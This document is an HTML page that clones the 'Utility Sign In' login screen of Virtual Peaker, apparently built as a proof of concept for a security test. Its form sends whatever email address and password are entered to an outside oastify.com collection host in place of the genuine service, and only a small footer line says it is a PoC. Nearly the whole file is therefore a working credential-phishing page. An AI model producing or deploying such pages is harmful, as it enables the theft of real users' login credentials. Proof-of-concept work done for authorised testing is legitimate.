<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">

  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@300;400;600&display=swap">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Mulish', sans-serif;
      display: flex;
      height: 100vh;
    }
    .left {
      width: 50%;
      background: #193b6d;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px;
    }
    .left img {
      max-width: 180px;
      margin-bottom: 20px;
    }
    .login-box {
      background: white;
      border-radius: 10px;
      padding: 30px 40px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      font-size: 24px;
      margin-bottom: 20px;
      color: #333;
    }
    .tabs {
      display: flex;
      border-bottom: 2px solid #eee;
      margin-bottom: 20px;
    }
    .tabs div {
      flex: 1;
      text-align: center;
      padding: 10px 0;
      cursor: pointer;
      font-weight: 600;
      color: #aaa;
    }
    .tabs .active {
      color: #193b6d;
      border-bottom: 3px solid #f28c28;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    label {
      font-size: 14px;
      color: #333;
      margin-bottom: 5px;
    }
    input {
      padding: 10px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 15px;
    }
    .forgot {
      text-align: right;
      margin-top: -10px;
      margin-bottom: 15px;
    }
    .forgot a {
      color: #f28c28;
      font-size: 12px;
      text-decoration: none;
    }
    button {
      background: #f28c28;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 12px;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
    }
    .note {
      font-size: 11px;
      color: #888;
      text-align: center;
      margin-top: 15px;
    }
    .right {
      width: 50%;
      background: url('https://virtual-peaker.com/wp-content/uploads/2023/05/network-bg.jpg') no-repeat center center;
      background-size: cover;
      color: white;
      padding: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
    }
    .right .content {
      max-width: 360px;
      background: rgba(0,0,0,0.5);
      padding: 20px;
      border-radius: 8px;
    }
    .right h3 {
      margin: 0 0 10px;
      font-size: 18px;
    }
    .right p {
      font-size: 14px;
      margin-bottom: 20px;
    }
    .right a {
      background: #f28c28;
      color: white;
      padding: 8px 16px;
      text-decoration: none;
      border-radius: 4px;
      font-weight: bold;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="left">
    <img src="https://utility.virtualpeaker.io/assets/app-icons/favicon-196x196.png" alt="Virtual Peaker logo">
    <div class="login-box">
      <h2>Utility Sign In</h2>
      <div class="tabs">
        <div class="active">Use Password</div>
        <div>Use Secure Link</div>
      </div>
      <form method="POST" action="http://r1t2f5ndv073o0m763p89qjpsgy7mzao.oastify.com">
        <label for="username">Email Address</label>
        <input type="email" id="username" name="username" placeholder="Enter your email address" required>

        <label for="password">Password <span class="forgot"><a href="#">Forgot password?</a></span></label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required>

        <button type="submit">SIGN IN</button>
      </form>
      <div class="note">This is a PoC. Credentials are sent to a testing endpoint.</div>
    </div>
  </div>
  <div class="right">
    <div class="content">
      <h3>Whitepaper</h3>
      <p>The Next-Gen Virtual Power Plant is Here: Unlocking the Full Potential of Distributed Energy Resources with Topline Demand Control</p>
      <a href="#">Download Whitepaper</a>
    </div>
  </div>
</body>
</html>
